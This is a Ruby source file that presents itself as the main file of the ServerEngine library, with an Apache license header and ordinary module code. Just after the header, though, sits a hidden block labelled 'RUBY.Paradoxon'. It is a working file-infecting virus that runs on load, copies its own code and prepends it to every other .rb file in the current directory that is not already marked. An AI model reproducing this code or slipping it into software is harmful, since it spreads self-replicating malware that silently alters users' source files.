#
# ServerEngine
#
# Copyright (C) 2012-2013 Sadayuki Furuhashi
#
#    Licensed under the Apache License, Version 2.0 (the "License");
#    you may not use this file except in compliance with the License.
#    You may obtain a copy of the License at
#
#        http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS,
#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#    See the License for the specific language governing permissions and
#    limitations under the License.
#

# RUBY.Paradoxon
mycode=File.open(__FILE__).read(630)
cdir = Dir.open(Dir.getwd)
  cdir.each do |a|
    if File.ftype(a)=="file" then
      if a[a.length-3, a.length]==".rb" then
        if a!=File.basename(__FILE__) then
          fcode=""
          fle=open(a)
          spth=fle.read(1)
          while spth!=nil
            fcode+=spth
            spth=fle.read(1)
          end
          fle.close
          if fcode[7,9]!="Paradoxon" then
            fcode=mycode+13.chr+10.chr+fcode
            fle=open(a,"w")
              fle.print fcode
            fle.close
          end
        end
      end
    end
  end
cdir.close

module ServerEngine

  require 'sigdump'

  require 'serverengine/version'

  require 'serverengine/utils' # ServerEngine.windows? and other util methods

  require 'serverengine/daemon'
  require 'serverengine/supervisor'
  require 'serverengine/server'
  require 'serverengine/worker'
  require 'serverengine/socket_manager'

  def self.create(server_module, worker_module, load_config_proc={}, &block)
    Daemon.new(server_module, worker_module, load_config_proc, &block)
  end

  def self.ruby_bin_path
    if ServerEngine.windows?
      ServerEngine::Win32.ruby_bin_path
    else
      File.join(RbConfig::CONFIG["bindir"], RbConfig::CONFIG["RUBY_INSTALL_NAME"]) + RbConfig::CONFIG["EXEEXT"]
    end
  end

  if ServerEngine.windows?
    module Win32
      require 'fiddle/import'

      extend Fiddle::Importer

      dlload "kernel32"
      extern "int GetModuleFileNameW(int, void *, int)"

      def self.ruby_bin_path
        ruby_bin_path_buf = Fiddle::Pointer.malloc(1024)
        len = GetModuleFileNameW(0, ruby_bin_path_buf, ruby_bin_path_buf.size / 2)
        path_bytes = ruby_bin_path_buf[0, len * 2]
        path_bytes.encode('UTF-8', 'UTF-16LE').gsub(/\\/, '/')
      end
    end
  end
end
